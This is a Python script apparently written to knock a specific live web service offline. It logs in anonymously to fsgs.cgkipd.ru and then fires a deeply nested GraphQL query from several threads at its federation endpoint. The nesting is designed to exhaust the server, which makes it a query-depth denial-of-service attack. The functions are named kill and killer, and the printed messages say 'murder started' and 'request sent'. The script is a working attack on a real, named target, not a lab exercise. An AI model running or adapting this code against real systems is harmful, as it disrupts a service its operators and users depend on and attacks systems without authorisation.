import time

import requests
import threading
from urllib3.exceptions import ProtocolError


def kill():
    print('Убийство начато')
    dead_req = {
        "operation": "account_set",
        "query": """query RegionConnection{contacts{edges{node{operator{fullName jdata contactsUuid representatives {
  operator{
    fullName representatives{
      fio operator{
        fullName 
        provider
        representatives{
          fio operator{
        fullName 
        representatives{
          fio operator{
        fullName 
        provider
        representatives{
          fio operator{
        fullName 
        representatives{
          fio fio operator{
        fullName 
        provider
        representatives{
          fio operator{
        fullName 
        representatives{
          fio fio operator{
        fullName 
        provider
        representatives{
          fio operator{
        fullName 
        representatives{
          fio fio operator{
        fullName 
        provider
        representatives{
          fio operator{
        fullName 
        representatives{
          fio fio operator{
        fullName 
        provider
        representatives{
          fio operator{
        fullName 
        representatives{
          fio fio operator{
        fullName 
        provider
        representatives{
          fio operator{
        fullName 
        representatives{
          fio fio operator{
        fullName 
        provider
        representatives{
          fio operator{
        fullName 
        representatives{
          fio fio operator{
        fullName 
        provider
        representatives{
          fio operator{
        fullName 
        representatives{
          fio fio operator{
        fullName 
        provider
        representatives{
          fio operator{
        fullName 
        representatives{
          fio}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}} }}}}}}} }address messenger}}}}"""
    }

    data = {
        "username": "anonymous",
        "password": "anonymous"
    }
    while True:
        try:
            req = requests.post(url='https://fsgs.cgkipd.ru/auth/login', json=data, timeout=2)
            req = req.json()
            access_token = req["data"]["access_token"]
            auth = "Bearer " + access_token
            break

        except (OSError, ProtocolError, requests.exceptions.ConnectionError):
            time.sleep(10)
            continue

    def killer():
        print('Запрос отправлен')
        z = requests.post(url="https://fsgs.cgkipd.ru/federation/graphql", headers={"authorization": auth},
                          json=dead_req)
        z = z.json()
        print(z)


    for i in range(5):
        thread = threading.Thread(target=killer, daemon=True, name=f'Thread#{i}')
        thread.start()
        time.sleep(0.1)

